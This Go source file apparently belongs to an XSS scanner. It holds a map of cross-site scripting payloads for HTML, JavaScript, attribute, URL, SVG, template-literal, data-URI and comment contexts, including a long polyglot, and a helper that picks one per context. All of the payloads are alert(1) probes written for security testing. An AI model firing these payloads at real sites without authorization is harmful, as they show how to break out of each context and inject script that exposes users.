package payloads

import "github.com/lcalzada-xor/xxss/pkg/models"

// Polyglots is a map of context-specific XSS polyglots.
// These payloads are designed to work in multiple contexts simultaneously.
var Polyglots = map[models.ReflectionContext][]string{
	models.ContextHTML: {
		// 0xSobky's Polyglot: Works in HTML, Attributes, and Script blocks
		"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e",
		// Standard script injection
		"<script>alert(1)</script>",
		// Image onerror
		"<img src=x onerror=alert(1)>",
	},
	models.ContextJavaScript: {
		// Break out of single quotes
		"';alert(1);//",
		// Break out of double quotes
		"\";alert(1);//",
		// Break out of template literals
		"`-alert(1)-`",
		// Polyglot for JS strings
		"';alert(1);/*",
	},
	models.ContextAttribute: {
		// Break out of double quotes and add event handler
		"\" onmouseover=\"alert(1)",
		// Break out of single quotes and add event handler
		"' onmouseover='alert(1)",
		// Break out of tag
		"\"><script>alert(1)</script>",
	},
	models.ContextURL: {
		// Javascript protocol
		"javascript:alert(1)",
		// Data URI
		"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
	},
	models.ContextTemplateLiteral: {
		// Break out of template literal
		"${alert(1)}",
		"`+alert(1)+`",
		"${alert`1`}",
	},
	models.ContextSVG: {
		// SVG-specific payloads
		"<set attributeName=onmouseover value=alert(1)>",
		"<animate onbegin=alert(1)>",
		"<svg/onload=alert(1)>",
	},
	models.ContextMetaRefresh: {
		// Meta refresh URL injection
		"javascript:alert(1)",
		"data:text/html,<script>alert(1)</script>",
	},
	models.ContextDataURI: {
		// Data URI XSS
		"data:text/html,<script>alert(1)</script>",
		"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
	},
	models.ContextComment: {
		// Close comment and inject script
		"--><script>alert(1)</script>",
	},
}

// GetPolyglot returns a suggested polyglot based on the context.
// It prioritizes the most versatile polyglot for the given context.
func GetPolyglot(context models.ReflectionContext) string {
	// Default to the "Ultimate Polyglot" if context is unknown or generic HTML
	defaultPolyglot := "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e"

	if payloads, ok := Polyglots[context]; ok && len(payloads) > 0 {
		return payloads[0]
	}

	return defaultPolyglot
}
